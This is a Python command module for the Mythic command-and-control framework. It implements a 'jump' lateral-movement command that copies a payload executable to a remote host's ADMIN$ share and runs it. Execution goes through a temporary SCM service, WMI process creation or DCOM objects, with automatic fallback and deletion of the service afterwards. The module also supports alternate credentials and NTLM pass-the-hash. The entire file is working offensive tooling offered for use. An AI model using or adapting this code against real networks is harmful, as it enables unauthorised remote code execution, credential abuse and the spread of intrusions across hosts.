from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json
import random
import string
import uuid

_LOCAL_TARGETS = {"localhost", "127.0.0.1", "::1"}

JUMP_TYPES = ["psexec", "wmi", "dcom"]


def _is_local(target: str) -> bool:
    return target.lower() in _LOCAL_TARGETS


class JumpArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="type",
                cli_name="Type",
                display_name="Jump Type",
                type=ParameterType.ChooseOne,
                choices=JUMP_TYPES,
                description="Lateral movement technique: psexec (SCM service), wmi (WMI Win32_Process), or dcom (DCOM MMC20/ShellWindows).",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=3)],
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the uploaded binary.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="service_name",
                cli_name="ServiceName",
                display_name="Service Name",
                type=ParameterType.String,
                description="[psexec only] Name of temporary service to create. Leave blank for random.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="dcom_method",
                cli_name="DcomMethod",
                display_name="DCOM Method",
                type=ParameterType.ChooseOne,
                choices=["mmc20", "shellwindows"],
                description="[dcom only] DCOM object to use. Default: mmc20 (MMC20.Application).",
                default_value="mmc20",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
            CommandParameter(
                name="username",
                cli_name="Username",
                display_name="Username",
                type=ParameterType.String,
                description="[psexec/wmi] Optional username for alternate credential authentication.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=7)],
            ),
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                description="[psexec/wmi] Optional domain for alternate credential authentication.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=8)],
            ),
            CommandParameter(
                name="password",
                cli_name="Password",
                display_name="Password",
                type=ParameterType.String,
                description="[psexec/wmi] Optional plaintext password.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=9)],
            ),
            CommandParameter(
                name="hash",
                cli_name="Hash",
                display_name="NTLM Hash",
                type=ParameterType.String,
                description="[psexec only] Optional NTLM hash for pass-the-hash (used instead of password).",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=10)],
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


# ------ shared helper ------

async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
    )
    if response_search.Success:
        for r in response_search.Responses:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=r.Response.encode(),
                )
            )
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Response="\n".encode(),
            )
        )


# ------ psexec callbacks ------

async def psexec_delete_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to delete service"

    if task.TaskData.args.get_arg("_lm_used_token"):
        await SendMythicRPCTaskUpdate(
            MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="reverting token")
        )
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                SubtaskCallbackFunction="rev2self_callback",
                CommandName="rev2self",
                Params=json.dumps({}),
            )
        )
    else:
        response.Completed = True
    return response


async def rev2self_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to revert token"
    return response


async def psexec_start_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to start service"
    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="deleting service")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_delete_callback",
            CommandName="sc",
            Params=json.dumps({
                "delete": True,
                "computer": task.TaskData.args.get_arg("target"),
                "service": task.TaskData.args.get_arg("_lm_service_name"),
            }),
        )
    )
    return response


async def psexec_create_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to create service"
        response.Completed = True
        return response
    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="starting service")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_start_callback",
            CommandName="sc",
            Params=json.dumps({
                "start": True,
                "computer": task.TaskData.args.get_arg("target"),
                "service": task.TaskData.args.get_arg("_lm_service_name"),
            }),
        )
    )
    return response


async def psexec_upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    service = task.TaskData.args.get_arg("_lm_service_name") or ""

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="creating service")
    )

    if _is_local(target):
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                SubtaskCallbackFunction="psexec_create_callback",
                CommandName="sc",
                Params=json.dumps({
                    "create": True,
                    "computer": target,
                    "service": service,
                    "binpath": task.TaskData.args.get_arg("_lm_exec_cmd"),
                    "display_name": service,
                }),
            )
        )
    else:
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                CommandName="sc",
                Params=json.dumps({
                    "create": True,
                    "computer": target,
                    "service": service,
                    "binpath": task.TaskData.args.get_arg("_lm_exec_cmd"),
                    "display_name": service,
                }),
            )
        )
        await asyncio.sleep(15)
        await SendMythicRPCTaskUpdate(
            MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="starting remote service")
        )
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                CommandName="sc",
                Params=json.dumps({"start": True, "computer": target, "service": service}),
            )
        )
        await asyncio.sleep(15)
        await SendMythicRPCTaskUpdate(
            MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="deleting remote service")
        )
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                SubtaskCallbackFunction="psexec_delete_callback",
                CommandName="sc",
                Params=json.dumps({"delete": True, "computer": target, "service": service}),
            )
        )
    return response


async def psexec_token_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to create token"
        response.Completed = True
        return response
    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="uploading file...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_upload_callback",
            CommandName="upload",
            Params=json.dumps({
                "remote_path": task.TaskData.args.get_arg("_lm_remote_unc"),
                "file": task.TaskData.args.get_arg("payload"),
            }),
        )
    )
    return response


# ------ wmi callbacks ------

async def fallback_sc_delete_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: fallback sc delete failed"
    return response


async def fallback_sc_create_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: fallback sc create failed"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    service_name = task.TaskData.args.get_arg("_lm_service_name") or ""

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="fallback: starting service...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            CommandName="sc",
            Params=json.dumps({"start": True, "computer": target, "service": service_name}),
        )
    )
    await asyncio.sleep(15)
    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="fallback: deleting service...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="fallback_sc_delete_callback",
            CommandName="sc",
            Params=json.dumps({"delete": True, "computer": target, "service": service_name}),
        )
    )
    return response


async def wmi_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)

    if "error" not in task.SubtaskData.Task.Status.lower():
        response.Completed = True
        return response

    await SendMythicRPCResponseCreate(
        MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response=b"[!] WMI execution failed, falling back to sc (psexec-style)...\n",
        )
    )

    target = task.TaskData.args.get_arg("target") or ""
    exec_cmd = task.TaskData.args.get_arg("_lm_exec_cmd") or ""
    service_name = task.TaskData.args.get_arg("_lm_service_name") or ""

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="fallback: creating service...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="fallback_sc_create_callback",
            CommandName="sc",
            Params=json.dumps({
                "create": True,
                "computer": target,
                "service": service_name,
                "binpath": exec_cmd,
                "display_name": service_name,
            }),
        )
    )
    return response


async def wmi_upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    username = task.TaskData.args.get_arg("username") or ""
    password = task.TaskData.args.get_arg("password") or ""
    domain = task.TaskData.args.get_arg("domain") or ""

    params = {"command": task.TaskData.args.get_arg("_lm_exec_cmd"), "host": target}
    if username:
        params["username"] = username
    if password:
        params["password"] = password
    if domain:
        params["domain"] = domain

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="executing wmi...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="wmi_callback",
            CommandName="wmiexecute",
            Params=json.dumps(params),
        )
    )
    return response


# ------ dcom callbacks ------

async def dcom_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)

    if "error" not in task.SubtaskData.Task.Status.lower():
        response.Completed = True
        return response

    await SendMythicRPCResponseCreate(
        MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response=b"[!] DCOM execution failed, falling back to sc (psexec-style)...\n",
        )
    )

    target = task.TaskData.args.get_arg("target") or ""
    exec_cmd = task.TaskData.args.get_arg("_lm_exec_cmd") or ""
    service_name = task.TaskData.args.get_arg("_lm_service_name") or ""

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="fallback: creating service...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="fallback_sc_create_callback",
            CommandName="sc",
            Params=json.dumps({
                "create": True,
                "computer": target,
                "service": service_name,
                "binpath": exec_cmd,
                "display_name": service_name,
            }),
        )
    )
    return response


async def dcom_upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    method = task.TaskData.args.get_arg("dcom_method") or "mmc20"

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(TaskID=task.TaskData.Task.ID, UpdateStatus="executing dcom...")
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="dcom_callback",
            CommandName="dcomexec",
            Params=json.dumps({
                "command": task.TaskData.args.get_arg("_lm_exec_cmd"),
                "host": target,
                "method": method,
            }),
        )
    )
    return response


# ------ command class ------

class JumpCommand(CommandBase):
    cmd = "jump"
    attributes = CommandAttributes(
        dependencies=["upload", "sc", "make_token", "rev2self", "wmiexecute", "dcomexec"]
    )
    needs_admin = True
    help_cmd = "jump -Type <psexec|wmi|dcom> -Target <host> -Payload <file> [options]"
    description = (
        "Lateral movement: upload a payload and execute it on a remote host. "
        "psexec uses SCM service creation; wmi uses WMI Win32_Process::Create; "
        "dcom uses DCOM (MMC20.Application or ShellWindows). "
        "wmi and dcom fall back to sc (psexec-style) on execution failure."
    )
    version = 1
    script_only = True
    author = "@Lavender-exe"
    argument_class = JumpArguments
    attackmapping = ["T1021.002", "T1021.003", "T1021.006", "T1047", "T1569.002"]
    completion_functions = {
        # psexec
        "psexec_token_callback": psexec_token_callback,
        "psexec_upload_callback": psexec_upload_callback,
        "psexec_create_callback": psexec_create_callback,
        "psexec_start_callback": psexec_start_callback,
        "psexec_delete_callback": psexec_delete_callback,
        "rev2self_callback": rev2self_callback,
        # wmi
        "wmi_upload_callback": wmi_upload_callback,
        "wmi_callback": wmi_callback,
        # dcom
        "dcom_upload_callback": dcom_upload_callback,
        "dcom_callback": dcom_callback,
        # shared fallback
        "fallback_sc_create_callback": fallback_sc_create_callback,
        "fallback_sc_delete_callback": fallback_sc_delete_callback,
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

        jump_type = (taskData.args.get_arg("type") or "psexec").lower()
        target = taskData.args.get_arg("target")
        file_id = taskData.args.get_arg("payload")
        extra_args = taskData.args.get_arg("command") or ""

        if jump_type not in JUMP_TYPES:
            response.Success = False
            response.Error = f"Invalid type '{jump_type}'. Choose from: {', '.join(JUMP_TYPES)}"
            return response

        rand_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
        remote_unc = f"\\\\{target}\\ADMIN$\\Temp\\{rand_name}"
        exec_cmd = f"C:\\Windows\\Temp\\{rand_name}"
        if extra_args:
            exec_cmd += f" {extra_args}"
        service_name = taskData.args.get_arg("service_name") or str(uuid.uuid4())

        taskData.args.add_arg("_lm_exec_cmd", exec_cmd)
        taskData.args.add_arg("_lm_service_name", service_name)
        taskData.args.add_arg("_lm_remote_unc", remote_unc)

        response.DisplayParams = f"[{jump_type}] {target} -> {remote_unc}"

        if jump_type == "psexec":
            username = taskData.args.get_arg("username") or ""
            domain = taskData.args.get_arg("domain") or ""
            password = taskData.args.get_arg("password") or ""
            ntlm_hash = taskData.args.get_arg("hash") or ""

            using_creds = username and (password or ntlm_hash)
            taskData.args.add_arg("_lm_used_token", bool(using_creds))

            if using_creds:
                token_params = {
                    "username": username,
                    "domain": domain or ".",
                    "password": ntlm_hash if ntlm_hash else password,
                }
                response.TaskStatus = "creating token..."
                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        SubtaskCallbackFunction="psexec_token_callback",
                        CommandName="make_token",
                        Params=json.dumps(token_params),
                    )
                )
            else:
                response.TaskStatus = "uploading file..."
                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        SubtaskCallbackFunction="psexec_upload_callback",
                        CommandName="upload",
                        Params=json.dumps({"remote_path": remote_unc, "file": file_id}),
                    )
                )

        elif jump_type == "wmi":
            response.TaskStatus = "uploading file..."
            await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    SubtaskCallbackFunction="wmi_upload_callback",
                    CommandName="upload",
                    Params=json.dumps({"remote_path": remote_unc, "file": file_id}),
                )
            )

        elif jump_type == "dcom":
            response.TaskStatus = "uploading file..."
            await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    SubtaskCallbackFunction="dcom_upload_callback",
                    CommandName="upload",
                    Params=json.dumps({"remote_path": remote_unc, "file": file_id}),
                )
            )

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
